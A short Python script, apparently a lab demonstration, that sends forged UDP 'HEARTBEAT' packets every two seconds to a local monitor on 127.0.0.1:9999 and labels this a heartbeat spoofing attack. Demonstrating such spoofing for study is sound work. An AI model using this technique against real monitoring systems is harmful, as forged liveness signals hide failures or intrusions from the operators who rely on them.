
import socket
import time
from datetime import datetime

HOST = "127.0.0.1"
PORT = 9999
INTERVAL = 2


def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def run_attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"[{timestamp()}] Heartbeat spoofing attack started.")
    print(f"Target monitor: {HOST}:{PORT}")
    print("Sending forged heartbeats every 2 seconds.")
    print("Press Ctrl+C to stop.")

    try:
        while True:
            sock.sendto(b"HEARTBEAT", (HOST, PORT))

            print(f"[{timestamp()}] Forged heartbeat sent.")
            time.sleep(INTERVAL)

    except KeyboardInterrupt:
        print(f"\n[{timestamp()}] Attack stopped.")

    finally:
        sock.close()


if __name__ == "__main__":
    run_attack()

